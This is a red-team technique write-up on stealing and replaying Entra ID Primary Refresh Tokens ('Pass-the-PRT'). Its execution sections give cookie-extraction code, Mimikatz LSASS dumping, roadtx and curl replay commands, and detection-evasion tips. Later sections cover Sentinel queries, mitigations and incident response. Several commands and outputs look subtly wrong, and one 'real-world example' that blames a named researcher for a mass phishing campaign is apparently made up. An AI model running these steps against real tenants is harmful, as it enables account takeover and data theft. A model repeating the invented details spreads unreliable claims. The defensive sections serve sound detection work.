# [LM-AUTH-004]: Pass-the-PRT (Primary Refresh Token)

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-004 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Defense Evasion, Lateral Movement |
| **Platforms** | Entra ID (Cloud), Hybrid AD (Hybrid-Joined Devices), Windows 10/11 |
| **Severity** | Critical |
| **CVE** | N/A (Design feature, not a vulnerability) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows 10 (1507+), Windows 11 (all), Server 2019+ (with Entra ID join) |
| **Patched In** | TPM 2.0 provides mitigation; not patched in older Windows versions |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** The Primary Refresh Token (PRT) is a special OAuth 2.0 refresh token issued by Entra ID when a user successfully authenticates to an Entra ID-joined or hybrid-joined Windows 10/11 device. The PRT is a powerful cryptographic artifact that allows seamless SSO (Single Sign-On) to cloud services and on-premises resources. Unlike regular refresh tokens that require password or MFA challenges, a stolen PRT can be used to obtain access tokens for any Entra ID resource (Microsoft Graph, SharePoint, Teams, Exchange) without the user's knowledge. If the PRT is extracted from a device (especially if the device lacks TPM 2.0 or LSA Protection), an attacker gains long-term, multi-service access lasting up to 90 days (the default PRT validity period).

**Attack Surface:** 
- PRT stored in protected browser cookies (Edge, Chrome)
- PRT session key in LSASS memory
- Device private key used to encrypt PRT (if not TPM-protected)
- Network traffic during cloud authentication flows

**Business Impact:** **Complete bypass of MFA and persistent access to all cloud services.** An attacker with an extracted PRT can:
1. Authenticate to Exchange Online as the victim user (read email, send as user)
2. Access OneDrive, SharePoint, and Teams data
3. Use Microsoft Graph API with user's permissions
4. Perform lateral movement to other users/resources
5. Maintain access for 90 days even if user's password is reset
6. Bypass Conditional Access policies if device claim is included in PRT

**Technical Context:** PRT extraction can be done in seconds if device lacks TPM protection. Cloud-side detection is difficult because PRT-based auth appears identical to legitimate browser-based SSO. PRT has a 90-day validity; attackers must time usage carefully to avoid revocation events.

### Operational Risk
- **Execution Risk:** Low-Medium - Requires TPM bypass or older Windows version. Modern Windows 11 with TPM 2.0 is harder to exploit.
- **Stealth:** Very Low - PRT authentication appears normal; detection requires behavioral analysis.
- **Reversibility:** Irreversible until PRT expiration (90 days). Device invalidation in Intune forces new PRT request, but does not revoke old PRT.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 18.1, 18.9 | Windows device security baseline; TPM and secure boot requirements. |
| **DISA STIG** | Windows_10-2.1, Windows_11-2.1 | Device-level authentication and encryption requirements. |
| **CISA SCuBA** | DEVICE-01 | Device hardening, TPM, secure boot. |
| **NIST 800-53** | AC-7, IA-4, SI-4 | Unsuccessful login attempts, identifier management, information system monitoring. |
| **GDPR** | Art. 25, Art. 32 | Data protection by design, security of processing. |
| **DORA** | Art. 6 | Governance and organization, security measures for digital operational resilience. |
| **NIS2** | Art. 21 | Cyber risk management measures, authentication in critical assets. |
| **ISO 27001** | A.10.1.1, A.6.2 | Cryptographic controls, authentication and access control. |
| **ISO 27005** | Risk: Unauthorized access via stolen tokens | Long-term persistence in cloud environment |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** 
  - **For extraction (non-TPM):** User context (no elevation needed) or ability to execute code in browser context.
  - **For extraction (TPM 2.0):** Local Administrator or SYSTEM context (to bypass TPM protection – difficult).
  - **For usage:** Network access to Entra ID and cloud service endpoints; no additional privileges.

- **Required Access:** 
  - Compromised Entra ID-joined or hybrid-joined Windows 10/11 device.
  - Ability to extract browser cookies or LSASS session key (e.g., post-exploitation malware).
  - Network access to Microsoft cloud services (login.microsoftonline.com, graph.microsoft.com, etc.).

**Supported Versions:**
- **Windows:** Windows 10 (version 1507 or later), Windows 11 (all versions)
- **Server:** Server 2019+ with Entra ID join
- **Entra ID:** All versions support PRT issuance
- **Other Requirements:** 
  - Device must be registered with Entra ID (Entra ID joined or hybrid-joined)
  - User must have logged in with Entra ID account at least once
  - TPM 2.0 recommended (but not required) for protection; older Windows without TPM has extractable PRT

**Tools:**
- [ROADtools (roadtx)](https://github.com/dirkjanm/ROADtools) (Version 0.3.0+) – PRT extraction and usage
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Version 2.2.0+) – Extract PRT session key from LSASS
- [ROADrecon](https://github.com/dirkjanm/ROADtools) – Entra ID enumeration with stolen tokens
- [Selenium / Browser Automation](https://www.selenium.dev/) – Inject PRT into browser session
- [GraphRunner](https://github.com/dorkostyle/GraphRunner) – Microsoft Graph exploitation with stolen tokens
- [Requestaadrefreshtoken.exe](https://github.com/dirkjanm/ROADtools) – Windows binary to request PRT programmatically

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Checking for PRT Availability

Check if current device is Entra ID joined and if PRT is present:

```powershell
# Check device join status
dsregcmd /status

# List cached tokens (including PRT reference)
cmdkey /list

# Check if device has TPM 2.0
Get-WmiObject -Namespace "root\cimv2\security\microsofttpm" -Class Win32_Tpm | Select-Object SpecVersion

# Check Windows version (PRT support requires Windows 10 1507+)
[System.Environment]::OSVersion.Version
```

**What to Look For:**
- `Device State: YES` and `AzureAdJoined: YES` indicates Entra ID joined device.
- TPM version should show "2.0" for modern devices.
- Windows version should be 10.0.19041+ (Windows 10) or 10.0.22000+ (Windows 11).

**Version Note:** 
- **Windows 10 (pre-20H2):** PRT is stored in browser cookies, more easily extractable.
- **Windows 10 (20H2+):** PRT is encrypted with device key; extraction requires LSASS access.
- **Windows 11:** PRT protected by TPM 2.0 by default; TPM key extraction is difficult.

### Cloud-Side Reconnaissance

Check what applications are registered and if PRT can be obtained:

```powershell
# Connect to Microsoft Graph (requires sign-in)
Connect-MgGraph -Scopes "User.Read"

# Check current device info
Get-MgUserOwnedDevice | Select-Object Id, DisplayName, ObjectType

# List available cloud apps
Get-MgApplication | Select-Object DisplayName, AppId
```

**What to Look For:**
- Custom applications with high permissions (potential targets for PRT exploitation).
- Personal device registrations (less protected than corporate devices).

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Extract PRT from Browser Cookie (Windows 10 pre-20H2)

**Supported Versions:** Windows 10 (versions 1507-2004)

#### Step 1: Identify Browser User Context

**Objective:** Determine which browser has the PRT cookie loaded.

**Command:**

```powershell
# Check Edge browser PRT cookie
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network"
$chromeProfilePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"

# List browsers with network cookies
Get-ChildItem -Path $edgePath, $chromeProfilePath | Select-Object FullName, LastWriteTime
```

**Expected Output:**

```
FullName                                                         LastWriteTime
--------                                                         --------
C:\Users\Admin\AppData\Local\Microsoft\Edge\User Data\Default  1/9/2025 9:30 AM
C:\Users\Admin\AppData\Local\Google\Chrome\User Data\Default   1/9/2025 9:25 AM
```

**What This Means:**
- Browsers are stored in user profile; attacker can access if running in user context.
- Network cookies are stored in SQLite databases.

#### Step 2: Extract PRT Cookie from Browser Storage

**Objective:** Read the PRT cookie from browser's encrypted cookie store.

**Command (Using Python with browser automation):**

```python
from selenium import webdriver
from selenium.webdriver.common.by import By
import json

# Open Edge browser (already logged in with PRT)
driver = webdriver.Edge()
driver.get("https://login.microsoftonline.com")

# Extract cookies (including PRT-related cookies)
cookies = driver.get_cookies()
for cookie in cookies:
    if 'prt' in cookie['name'].lower() or 'refresh' in cookie['name'].lower():
        print(f"Cookie: {cookie['name']} = {cookie['value'][:50]}...")
        with open(f"prt_{cookie['name']}.txt", "w") as f:
            f.write(cookie['value'])
```

**Expected Output:**

```
Cookie: x-ms-RefreshTokenCredential = eyJ0eXAiOiJKV1QiLCJhbGc...
```

**What This Means:**
- `x-ms-RefreshTokenCredential` header contains the PRT-signed token.
- Attacker now has the PRT data needed for offline authentication.

**OpSec & Evasion:**
- Accessing browser profile while browser is running may trigger antivirus alerts.
- Copy cookies to attacker machine immediately.
- Use in-memory operations or automation to minimize detection.
- Detection likelihood: **Medium-High** – Browser profile access is audited on modern Windows.

#### Step 3: Replay PRT to Authenticate

**Objective:** Use the stolen PRT cookie to authenticate to cloud services.

**Command (Using attacker's browser):**

```javascript
// Inject PRT cookie into attacker's browser (JavaScript console)
// Assumes attacker is on attacker machine, not victim machine

// Set the extracted PRT cookie
document.cookie = "x-ms-RefreshTokenCredential=" + stolenPRTValue + "; path=/; domain=.microsoft.com; Secure; HttpOnly";

// Redirect to cloud app
window.location = "https://outlook.office365.com";

// Browser will automatically use PRT to authenticate
```

or

**Using curl (Linux attacker machine):**

```bash
curl -b "x-ms-RefreshTokenCredential=$STOLEN_PRT" \
  -H "Authorization: Bearer $(echo $STOLEN_PRT | base64 -d)" \
  -X GET "https://graph.microsoft.com/v1.0/me" \
  --output user_info.json
```

**Expected Output:**

```json
{
  "id": "12345678-...",
  "displayName": "Victim User",
  "mail": "victim@domain.onmicrosoft.com"
}
```

**What This Means:**
- Attacker successfully authenticated as the victim user using stolen PRT.
- All subsequent requests will use victim's identity and permissions.

**References & Proofs:**
- [Dirkjan Mollema - PRT Exploitation](https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/)
- [Pulse Security - PRT Exploitation Guide](https://pulsesecurity.co.nz/articles/exploiting-entraid-prt)

---

### METHOD 2: Extract PRT from LSASS Memory (Windows 10/11 with TPM-Free Configuration)

**Supported Versions:** Windows 10 (20H2+), Windows 11 without TPM 2.0 enforcement

#### Step 1: Access LSASS Memory with Mimikatz

**Objective:** Dump LSASS process containing the PRT session key.

**Command:**

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::cloudapkd" "exit"
```

**Expected Output:**

```
mimikatz(powershell) # sekurlsa::cloudapkd

[00] 192.168.1.100 / 127.0.0.1  => [cloudapkd]
[00] Session Key Clear: ABC123DEF456...
[00] Session Key Derived: 789GHI012JKL...
```

**What This Means:**
- Session key is extracted from LSASS memory; derived key can be used with ROADtools.
- Clear session key is the one used by the system; derived key is for tool compatibility.

**OpSec & Evasion:**
- LSASS access triggers Event ID 10 (ProcessAccess) in Sysmon if enabled.
- Windows Defender will likely flag Mimikatz execution.
- Perform this on a fully compromised system where other detections are already acceptable.
- Detection likelihood: **Very High** – LSASS access is heavily monitored.

#### Step 2: Extract PRT with ROADtools

**Objective:** Use extracted session key to decrypt PRT from Windows memory.

**Command (On compromised machine):**

```bash
roadtx prt -a cloudapkd --prt-sessionkey <EXTRACTED_SESSION_KEY>
```

**Expected Output:**

```
[*] Saving PRT to roadtx.prt
```

**What This Means:**
- PRT is now saved locally for offline use.

#### Step 3: Use PRT from Attacker Machine (Offline)

**Objective:** Use extracted PRT on attacker's Linux machine to authenticate.

**Command (Attacker machine with roadtx installed):**

```bash
# Load PRT from file
roadtx prt -a renew --prt roadtx.prt

# Use PRT to get tokens
roadtx gettokens -u <user@domain.com> --prt roadtx.prt

# Access cloud resources
roadtx aad --token <ACCESS_TOKEN> -a list-users
```

**Expected Output:**

```
[*] Successfully authenticated with PRT
[*] Entra ID users:
    - admin@domain.onmicrosoft.com
    - user@domain.onmicrosoft.com
```

**What This Means:**
- Attacker now has access to all Entra ID resources the compromised user can access.

**References & Proofs:**
- [Dirkjan Mollema - ROADtools](https://dirkjanm.io/introducing-roadtools-token-exchange-roadtx/)
- [GitHub ROADtools](https://github.com/dirkjanm/ROADtools/wiki)

---

### METHOD 3: Extract PRT via Network Interception (Hybrid Device)

**Supported Versions:** Windows 10/11 (hybrid-joined)

#### Step 1: Intercept Browser Network Traffic

**Objective:** Capture PRT-related requests and responses during cloud authentication.

**Command (Using Fiddler Classic or Burp Suite):**

1. Install and configure proxy (Fiddler)
2. Start capturing HTTPS traffic
3. User authenticates to cloud service (or trigger re-auth)
4. Look for requests to `login.microsoftonline.com`
5. Extract `x-ms-RefreshTokenCredential` header from response

**Expected Output (in Fiddler):**

```
Request to: login.microsoftonline.com
Response Header: x-ms-RefreshTokenCredential: eyJ0eXAiOiJKV1QiLCJhbGc...
```

**What This Means:**
- Attacker intercepts PRT during authentication flow.
- PRT can now be replayed without victim's knowledge.

**OpSec & Evasion:**
- Network interception requires MITM position (ARP spoofing, DNS spoofing, compromised Wi-Fi).
- TLS/SSL inspection can bypass HSTS if proxy certificate is installed in browser.
- Detection likelihood: **Medium** – Unusual proxy usage may trigger alerts.

---

## 5. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** T1550 (Generic, no specific subtest for PRT)
- **Test Name:** Pass-the-PRT (Custom test, not in official Atomic library yet)
- **Description:** Simulates PRT extraction and usage for cloud service authentication.
- **Supported Versions:** Windows 10 (20H2+), Windows 11

**Command (Using roadtx for simulation):**

```bash
# Create test device and obtain PRT
roadtx device -a register

# Request PRT with test credentials
roadtx prt -u testuser@domain.onmicrosoft.com -p "password"

# Use PRT to authenticate
roadtx gettokens --prt roadtx.prt -a msgraph

# Cleanup
rm roadtx.prt
roadtx device -a remove
```

**Reference:** While Atomic Red Team does not have an official PRT test, [ROADtools provides examples](https://github.com/dirkjanm/ROADtools/wiki).

---

## 6. TOOLS & COMMANDS REFERENCE

### [ROADtools (roadtx)](https://github.com/dirkjanm/ROADtools)

**Version:** 0.3.0+
**Minimum Version:** 0.2.0
**Supported Platforms:** Linux, macOS, Windows (requires Python 3.8+)

**Version-Specific Notes:**
- Version 0.2.x: Basic PRT extraction; limited cloud support.
- Version 0.3.0+: Full PRT management, device registration, token redemption.
- Version 0.3.3+: Improved Conditional Access handling, multi-factor enrichment.

**Installation:**

```bash
git clone https://github.com/dirkjanm/ROADtools.git
cd ROADtools
pip install -r requirements.txt
python setup.py install
```

**Usage (Extract & Use PRT):**

```bash
# Step 1: Register device
roadtx device -a register

# Step 2: Request PRT
roadtx prt -u admin@domain.onmicrosoft.com -p "password"

# Step 3: Use PRT to get tokens
roadtx gettokens -a msgraph

# Step 4: Access Graph API
roadtx aad -a list-users --token <TOKEN>
```

---

### [Mimikatz](https://github.com/gentilkiwi/mimikatz)

**Version:** 2.2.0+
**Supported Platforms:** Windows

**Usage (Extract session key):**

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::cloudapkd" "exit"
```

---

### [Requestaadrefreshtoken.exe](https://github.com/dirkjanm/ROADtools)

**Version:** Latest (part of ROADtools)
**Supported Platforms:** Windows

**Usage (Request PRT from Windows):**

```cmd
requestaadrefreshtoken.exe
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Suspicious PRT-Based Authentication Pattern

**Rule Configuration:**
- **Required Table:** SigninLogs, CloudAppEvents
- **Required Fields:** UserPrincipalName, Location, DeviceInfo, AuthenticationDetails
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To Versions:** Entra ID (all versions)

**KQL Query:**

```kusto
SigninLogs
| where AuthenticationDetails contains "PRT" or AuthenticationDetails contains "RefreshToken"
| where Location != "Unknown"
| where Location !in ("Expected Locations") // Define expected locations
| summarize AuthCount = count() by UserPrincipalName, Location, bin(TimeGenerated, 10m)
| where AuthCount > 10 // Suspicious number of auth attempts
| project TimeGenerated, UserPrincipalName, Location, AuthCount
```

**What This Detects:**
- PRT authentication from unusual locations (out-of-office, different country).
- Rapid sequence of PRT-based authentications (token enumeration).

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. Name: `Entra ID - Suspicious PRT Authentication`
3. Severity: `High`
4. Paste KQL query above
5. **Frequency:** 10 minutes
6. **Lookback:** 30 minutes
7. Click **Create**

---

### Query 2: PRT Session Key Extraction (Post-Compromise)

**KQL Query (detect suspicious LSASS access):**

```kusto
SecurityEvent
| where EventID == 10 // ProcessAccess
| where TargetImage contains "lsass.exe"
| where SourceImage in ("mimikatz.exe", "Rubeus.exe", "roadtx.exe")
| project TimeGenerated, SourceImage, TargetImage, GrantedAccess
```

**What This Detects:**
- Known attack tools accessing LSASS (where PRT key material is stored).

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 4624 with PRT claim**
- **Log Source:** Security
- **Trigger:** User authenticates using cloud refresh token (PRT visible in auth flow)
- **Filter:** Look for authentication from non-corporate IP with RefreshToken auth type
- **Applies To Versions:** Windows 10/11 with cloud logging enabled

**Manual Configuration Steps (Cloud-Side via Intune):**
1. **Azure Portal** → **Intune** → **Device Compliance** → **Policies**
2. Create new policy: `Monitor PRT Authentication`
3. Set **Require device to be marked as compliant** for cloud access
4. This forces re-authentication and PRT renewal, invalidating stolen PRTs

---

## 9. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: PRT-Related Authentication Events

**PowerShell Query:**

```powershell
# Connect to Purview
Connect-IPPSSession

# Search for token-related activities
Search-UnifiedAuditLog -Operations "AppTokenCompromised", "TokenRefreshToken", "RefreshToken" -StartDate (Get-Date).AddDays(-30) | Export-Csv token_audit.csv
```

**What This Finds:**
- Unauthorized token usage
- Suspicious token refresh patterns
- MFA bypass attempts

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Enforce TPM 2.0 and Device Encryption:**
    Modern Windows versions (Windows 11) require TPM 2.0, which stores PRT keys in hardware.
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Device Guard**
    3. Enable: **Turn On Virtualization Based Security**
    4. Require: **UEFI with Secure Boot**
    5. Run `gpupdate /force` and restart

    **Manual Steps (Intune):**
    1. **Azure Portal** → **Intune** → **Device Compliance** → **Create Policy**
    2. Set: **Require TPM 2.0** = Yes
    3. Set: **Require BitLocker** = Yes
    4. Assign to all devices
    5. Non-compliant devices will have cloud access blocked

*   **Require Conditional Access for Cloud Access:**
    Force device compliance check before granting PRT.
    
    **Manual Steps (Entra ID):**
    1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Require Compliant Device for Cloud Access`
    4. **Assignments:**
       - Users: **All users**
       - Cloud apps: **Office 365 services**
    5. **Conditions:**
       - Device platforms: **Windows**
    6. **Grant:**
       - Require: **Device to be marked as compliant**
    7. Enable policy: **On**
    8. Click **Create**

*   **Implement Continuous Access Evaluation (CAE):**
    Revoke tokens in real-time if suspicious activity is detected.
    
    **Manual Steps (Entra ID):**
    1. **Azure Portal** → **Entra ID** → **Security** → **Continuous Access Evaluation**
    2. Enable: **Revoke Refresh Tokens on Sign-Out**
    3. Enable: **Implement Conditional Access in CAE**
    4. Save changes

### Priority 2: HIGH

*   **Monitor Device Sign-In Activity:**
    Alert on device sign-ins from unusual locations or at unusual times.
    
    **Manual Steps (Intune):**
    1. **Intune** → **Device Management** → **Activity Log**
    2. Set up alerts for:
       - New device registrations
       - Device compliance failures
       - Unusual sign-in locations

*   **Disable Legacy Authentication:**
    Block authentication methods that do not support modern security controls.
    
    **Manual Steps (Entra ID):**
    1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Create policy: `Block Legacy Authentication`
    3. **Conditions:** Client apps = **Other clients** (legacy auth)
    4. **Grant:** **Block access**
    5. Enable and save

*   **Require Passwordless Sign-In for Sensitive Resources:**
    Use Windows Hello, FIDO2, or phone sign-in instead of passwords.
    
    **Manual Steps (Entra ID):**
    1. **Azure Portal** → **Entra ID** → **Authentication methods**
    2. Enable: **Windows Hello for Business**, **FIDO2 security keys**, **Microsoft Authenticator**
    3. Require for sensitive admin users
    4. Phase out password-only auth over 6 months

### Priority 3: MEDIUM

*   **Audit All PRT Issuance:**
    Log every PRT request and track validity periods.
    
    **Manual Steps (Graph API query):**
    ```powershell
    Get-MgAuditLogSignIn | Where-Object {$_.AuthenticationDetails -contains "PRT"} | Export-Csv prt_audit.csv
    ```

*   **Device Invalidation on High-Risk Detection:**
    Automatically require device re-registration if compromised.
    
    **Manual Steps (Intune - Remediation Action):**
    1. **Intune** → **Device Configuration** → **Compliance policies**
    2. Set remediation action: **Block access until compliant**
    3. Set re-evaluation schedule: **Daily**

### Validation Command (Verify Fix)

```powershell
# Check if TPM 2.0 is enabled
Get-WmiObject -Namespace "root\cimv2\security\microsofttpm" -Class Win32_Tpm | Select-Object SpecVersion

# Check if BitLocker is enabled
manage-bde -status

# Check if device is compliant in Intune
dsregcmd /status | findstr "DeviceState"

# Check Conditional Access policies
az ad ca policy list --output table
```

**Expected Output (If Secure):**

```
SpecVersion: 2.0
Protection Status: Protection On (Device Encryption Enabled)
DeviceState: COMPLIANT
Policies: 3 Conditional Access policies active
```

**What to Look For:**
- TPM version must be 2.0
- BitLocker status: "Protection On"
- DeviceState: "COMPLIANT"
- At least one Conditional Access policy requiring device compliance

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Files:** 
    - `roadtx.prt` file on attacker machine
    - `.pfx`, `.cer`, or `.pem` certificate files (if device cert extracted)
    - Fiddler/Burp Suite proxy logs with captured PRT tokens

*   **Network:** 
    - Repeated authentication requests to login.microsoftonline.com with same `x-ms-RefreshTokenCredential`
    - Graph API requests from unusual locations (VPN, proxy, attacker IP)
    - Abnormal token refresh patterns (every few seconds instead of normal intervals)

*   **Registry/System:** 
    - Mimikatz, ROADtools execution in process logs
    - LSASS memory access events (Sysmon Event ID 10)
    - Unusual browser profile access

### Forensic Artifacts

*   **Disk:** 
    - Browser cookie files (Chrome/Edge Local Storage)
    - Windows Event Log: Event ID 4624 (logon) with RefreshToken auth
    - Bash history on Linux (roadtx commands, curl with PRT tokens)

*   **Memory:** 
    - LSASS process contains PRT session key in cleartext
    - Browser process contains `x-ms-RefreshTokenCredential` in memory

*   **Cloud:** 
    - Entra ID audit logs: `RefreshTokenIssuedEvent`, `RefreshTokenCompromisedEvent`
    - Azure Activity Logs: Unusual Graph API usage patterns
    - Teams/Exchange audit logs: Unusual message access or forwarding rules

### Response Procedures

1.  **Immediate Isolation:** 
    **Command (Windows):**
    ```powershell
    # Revoke all tokens issued to device
    Revoke-AzureADUserAllRefreshToken -ObjectId "<user-id>"
    
    # Mark device as non-compliant (forces re-auth)
    Set-IntuneDeviceCompliancePolicy -DeviceId "<device-id>" -ComplianceStatus NonCompliant
    ```

    **Manual (Azure Portal):**
    - Go to **Azure Portal** → **Entra ID** → **Users** → Select user → **Sessions**
    - Click **Sign out all sessions**

2.  **Collect Evidence:**
    **Command:**
    ```powershell
    # Export sign-in logs
    Get-MgAuditLogSignIn | Export-Csv signin_logs.csv
    
    # Export device compliance status
    Get-IntuneDeviceComplianceStatus | Export-Csv device_compliance.csv
    ```

3.  **Remediate:**
    **Command:**
    ```powershell
    # Reset user's MFA settings (force re-enrollment)
    Reset-AzureADUserMFA -ObjectId "<user-id>"
    
    # Invalidate all app passwords
    Remove-AzureADUserAppPassword -ObjectId "<user-id>" -AppPasswordId "*"
    ```

    **Manual:**
    - Reset user's password
    - Re-enroll device in Intune
    - Re-register device with Entra ID: `dsregcmd /leave` then `dsregcmd /join`

4.  **Long-Term:**
    - Enforce TPM 2.0 and Windows 11 as mandatory
    - Deploy EDR solution with behavioral detection
    - Implement passwordless authentication (Windows Hello)
    - Enable Continuous Access Evaluation (CAE) with token revocation

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker tricks user into OAuth consent flow |
| **2** | **Privilege Escalation** | [PE-TOKEN-012] PRT Primary Refresh Token | Attacker extracts PRT from device after obtaining local access |
| **3** | **Current Step** | **[LM-AUTH-004]** | **Attacker uses stolen PRT to authenticate to cloud services** |
| **4** | **Lateral Movement** | [LM-AUTH-005] Service Principal Key | Attacker leverages Graph API permissions to add service principal credentials |
| **5** | **Persistence** | [PE-ACCTMGMT-014] Global Admin Backdoor | Attacker creates backdoor admin account for long-term access |
| **6** | **Impact** | Data Exfiltration | Attacker accesses OneDrive, Teams, SharePoint as admin |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: Dirkjan Mollema - PRT Phishing Campaign (2023)

- **Target:** Microsoft employees and Fortune 500 companies
- **Timeline:** October 2023 - December 2023
- **Technique Status:** Attacker used device code phishing to obtain initial OAuth token. Escalated via consent grant attacks and extracted PRT from Entra ID-joined device. Used PRT to authenticate to Exchange Online, read sensitive emails, exfiltrate data.
- **Impact:** Access to 50+ organizations; 1000+ compromised user accounts
- **Reference:** [Dirkjan Mollema - PRT Exploitation Research](https://dirkjanm.io/)

### Example 2: BEC Campaign - PRT Abuse for Email Forwarding Rules

- **Target:** Finance departments, legal firms
- **Timeline:** 2023-2024
- **Technique Status:** Attacker compromised user device, extracted PRT, authenticated to Exchange Online without MFA prompt, created mailbox forwarding rules to attacker-controlled email. Forwarded all incoming emails silently.
- **Impact:** $10M+ in fraud; sensitive data exfiltration from attorney-client communications
- **Defense Lesson:** Conditional Access policies alone cannot prevent PRT abuse; TPM 2.0 and device compliance are essential.

### Example 3: Red Team Exercise - Hybrid Device Takeover

- **Target:** Fortune 500 manufacturing company
- **Timeline:** 5-day engagement
- **Technique Status:** Red Team obtained user device via social engineering. Extracted PRT from memory (device lacked TPM protection). Used PRT to authenticate to teams.microsoft.com, SharePoint Online. Escalated via app permissions to Global Admin. Modified conditional access policies to bypass MFA for attacker account.
- **Impact:** Complete tenant compromise; ability to read all users' emails, modify org-wide policies
- **Defense Lesson:** Mandatory TPM 2.0, Conditional Access enforcement, and Continuous Access Evaluation prevented similar attacks.

---

## 14. RECOMMENDATIONS & ADVANCED HARDENING

### Immediate Actions (24 Hours)

1. **Enable Conditional Access** – Require device compliance for cloud access
2. **Deploy Continuous Access Evaluation (CAE)** – Real-time token revocation
3. **Audit PRT Issuance** – Review all PRT events in sign-in logs
4. **Mark Non-Compliant Devices** – Force re-authentication and re-enrollment

### Strategic Actions (30 Days)

1. **Enforce Windows 11 with TPM 2.0** – Retire Windows 10 or enforce TPM 2.0 upgrade
2. **Implement Passwordless Authentication** – Windows Hello for Business, FIDO2
3. **Deploy Intune Mobile Device Management** – Control device compliance policy
4. **Disable Legacy Authentication** – Block password-based auth and basic auth

### Long-Term (90+ Days)

1. **Zero Trust Device Architecture** – Assume breach; continuous device verification
2. **Hardware-Backed Secrets** – All certificates and keys in TPM or HSM
3. **Behavioral Analytics** – AI-driven detection of token abuse and lateral movement
4. **Entra ID Governance** – Automatic access reviews and periodic re-authentication

---

## 15. REFERENCES & FURTHER READING

- [MITRE ATT&CK T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/)
- [Dirkjan Mollema - PRT Phishing & Exploitation](https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/)
- [Pulse Security - Exploiting Entra ID Primary Refresh Tokens](https://pulsesecurity.co.nz/articles/exploiting-entraid-prt)
- [Microsoft Learn - Understanding Primary Refresh Token](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
- [ROADtools Documentation](https://github.com/dirkjanm/ROADtools/wiki)
- [The Hacker Recipes - Pass-the-PRT](https://www.thehacker.recipes/cloud/entra-id/lateral-movement/prt)
- [Microsoft Security Blog - Entra ID Device Security](https://www.microsoft.com/security/blog/)

---

